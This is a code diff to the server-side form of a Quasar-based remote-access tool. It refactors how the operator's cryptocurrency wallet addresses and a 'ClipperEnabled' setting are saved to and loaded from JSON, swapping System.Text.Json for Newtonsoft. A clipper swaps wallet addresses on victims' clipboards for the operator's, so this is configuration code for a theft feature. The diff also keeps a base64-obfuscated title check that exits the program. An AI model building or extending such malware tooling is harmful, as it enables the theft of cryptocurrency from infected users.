@@ -583,24 +583,25 @@ namespace Quasar.Server.Forms
 
         private void UpdateCryptoAddressesJson()
         {
-            var data = new
+            Dictionary<string, object> data = new Dictionary<string, object>();
+
+            Dictionary<string, string> addresses = new Dictionary<string, string>
             {
-                Addresses = new Dictionary<string, string>
-                {
-                    { "BTC", BTCTextBox.Text },
-                    { "LTC", LTCTextBox.Text },
-                    { "ETH", ETHTextBox.Text },
-                    { "XMR", XMRTextBox.Text },
-                    { "SOL", SOLTextBox.Text },
-                    { "DASH", DASHTextBox.Text },
-                    { "XRP", XRPTextBox.Text },
-                    { "TRX", TRXTextBox.Text },
-                    { "BCH", BCHTextBox.Text }
-                },
-                ClipperEnabled = ClipperCheckbox.Checked
+                { "BTC", BTCTextBox.Text },
+                { "LTC", LTCTextBox.Text },
+                { "ETH", ETHTextBox.Text },
+                { "XMR", XMRTextBox.Text },
+                { "SOL", SOLTextBox.Text },
+                { "DASH", DASHTextBox.Text },
+                { "XRP", XRPTextBox.Text },
+                { "TRX", TRXTextBox.Text },
+                { "BCH", BCHTextBox.Text }
             };
 
-            string json = JsonSerializer.Serialize(data, new JsonSerializerOptions { WriteIndented = true });
+            data["Addresses"] = addresses;
+            data["ClipperEnabled"] = ClipperCheckbox.Checked;
+
+            string json = Newtonsoft.Json.JsonConvert.SerializeObject(data, Newtonsoft.Json.Formatting.Indented);
             string filePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "crypto_addresses.json");
 
             File.WriteAllText(filePath, json);
@@ -614,11 +615,13 @@ namespace Quasar.Server.Forms
                 try
                 {
                     string json = File.ReadAllText(filePath);
-                    var data = JsonSerializer.Deserialize<Dictionary<string, object>>(json);
+                    var data = Newtonsoft.Json.JsonConvert.DeserializeObject<Dictionary<string, object>>(json);
 
                     if (data != null)
                     {
-                        var addresses = JsonSerializer.Deserialize<Dictionary<string, string>>(data["Addresses"].ToString());
+                        var addressesJson = data["Addresses"].ToString();
+                        var addresses = Newtonsoft.Json.JsonConvert.DeserializeObject<Dictionary<string, string>>(addressesJson);
+
                         if (addresses != null)
                         {
                             BTCTextBox.Text = addresses.ContainsKey("BTC") ? addresses["BTC"] : string.Empty;
@@ -632,7 +635,7 @@ namespace Quasar.Server.Forms
                             BCHTextBox.Text = addresses.ContainsKey("BCH") ? addresses["BCH"] : string.Empty;
                         }
 
-                        ClipperCheckbox.Checked = data.ContainsKey("ClipperEnabled") && ConvertJsonBool(data["ClipperEnabled"]);
+                        ClipperCheckbox.Checked = data.ContainsKey("ClipperEnabled") && Convert.ToBoolean(data["ClipperEnabled"]);
                     }
                 }
                 catch (Exception ex)
@@ -646,22 +649,6 @@ namespace Quasar.Server.Forms
             if (!(this.Text.StartsWith(System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(strAS)))))
             {
                 Environment.Exit(1337);
-            }
-        }
-
-        private bool ConvertJsonBool(object jsonElement)
-        {
-            if (jsonElement is JsonElement element1 && element1.ValueKind == JsonValueKind.True)
-            {
-                return true;
-            }
-            else if (jsonElement is JsonElement element2 && element2.ValueKind == JsonValueKind.False)
-            {
-                return false;
-            }
-            else
-            {
-                throw new InvalidOperationException("Invalid JSON boolean value.");
             }
         }
 
